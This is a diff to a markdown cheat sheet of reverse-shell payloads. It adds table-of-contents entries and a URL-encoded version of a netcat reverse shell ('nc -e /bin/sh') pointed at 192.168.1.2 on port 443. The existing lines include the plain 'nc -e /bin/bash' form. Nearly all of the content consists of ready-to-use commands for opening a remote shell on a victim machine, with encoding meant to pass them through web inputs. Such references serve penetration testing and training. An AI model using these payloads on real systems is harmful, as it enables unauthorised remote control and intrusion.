@@ -5,8 +5,10 @@
 - [<kbd>Netcat</kbd>](#Netcat)
   * [<kbd>Netcat Linux</kbd>](#Netcat-Linux)
       * [<kbd>-e</kbd>](#-e)
+      * [<kbd>-e [URL Encode]</kbd>](#-e-[URL-Encode])
       * [<kbd>-c</kbd>](#-c)
       * [<kbd>fifo</kbd>](#fifo)
+      * [<kbd>fifo [URL Encode]</kbd>](#fifo-[URL-Encode])
   * [<kbd>Netcat Windows</kbd>](#Netcat-Windows)
   * [<kbd>Netcat URL Encoding</kbd>](#Netcat-URL-Encoding)
   * [<kbd>Netcat Base64 Encoding</kbd>](#Netcat-Base64-Encoding)
@@ -119,6 +121,11 @@
  
   ```cmd 
   nc -e /bin/bash 192.168.1.2 443
+  ```
+  # <kbd>-e [URL Endode]</kbd>
+ 
+  ```cmd
+  nc%20-e%20%2Fbin%2Fsh%20192.168.1.2%20443
   ```
  
   # <kbd>-c</kbd>
